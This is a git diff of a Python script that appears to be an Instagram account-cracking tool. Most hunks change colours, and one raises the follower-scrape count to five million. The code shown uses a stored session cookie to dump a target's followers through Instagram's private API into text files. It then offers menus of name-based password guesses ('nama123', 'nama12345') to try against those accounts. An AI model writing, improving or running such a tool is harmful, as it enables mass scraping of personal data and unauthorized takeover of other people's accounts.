@@ -14,7 +14,7 @@ B = ('\x1b[1;96m')
 P = ('\x1b[1;97m')
 
 # Logo
-___logo___ = (f"""{H} W E L C O M E {P}🅉🄴🄴🄴🄴🄱
+___logo___ = (f"""{H} W E L C O M E {U}🅉🄴🄴🄴🄴🄱
 {K}[{P}•{K}]{P}——————————————————————————————
 {H}[{P}>{H}]{P} AUTHOR : {M}ZEEEE
 {H}[{P}>{H}]{P} IG : {M} @MHMDAZIZ04
@@ -155,7 +155,7 @@ def ___pengikut___():
             print(f"{H}[{P}?{H}]{P} Name :{K} {___roz['full_name']}\n")
             ___file = (___roz['full_name'].replace(' ','_')+'.txt')
         with requests.Session() as ses:
-            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
+            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
             for z in ___zak['users']:
                 open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                 print(f"{P}{z['username']}<=>{z['full_name']}")
@@ -308,10 +308,10 @@ class ___crack___:
         self.kill = 0
         self.ok = []
         self.cp = []
-        print(f"\n{H}[{P}1{H}]{P} {M}GUNAKAN PASSWORD {H}[{K}nama, nama123, nama12345{H}]{K}")
-        print(f"{H}[{P}2{H}]{P} {M}GUNAKAN PASSWORD {H}[{K}nama, nama123, nama1234, nama12345{H}]{K}")
-        print(f"{H}[{P}3{H}]{P} {M}GUNAKAN PASSWORD  {H}[{K}nama, nama123, nama1234, nama12345, nama123456{H}]{K}")
-        print(f"{H}[{P}4{H}]{P} {M}GUNAKAN PASSWORD MANUAL {H}[{K}>5{H}]{K}\n")
+        print(f"\n{H}[{P}1{H}]{P} {H}GUNAKAN PASSWORD {H}[{K}nama, nama123, nama12345{H}]{K}")
+        print(f"{H}[{P}2{H}]{P} {H}GUNAKAN PASSWORD {H}[{K}nama, nama123, nama1234, nama12345{H}]{K}")
+        print(f"{H}[{P}3{H}]{P} {H}GUNAKAN PASSWORD  {H}[{K}nama, nama123, nama1234, nama12345, nama123456{H}]{K}")
+        print(f"{H}[{P}4{H}]{P} {H}GUNAKAN PASSWORD MANUAL {H}[{K}>5{H}]{K}\n")
         ___pilih = input(f"{B}[{P}?{B}]{P} Pilih :{H} ")
         if ___pilih in ['4','04']:
             pwx = input(f"{B}[{P}?{B}]{P} Password :{H} ").split(',')
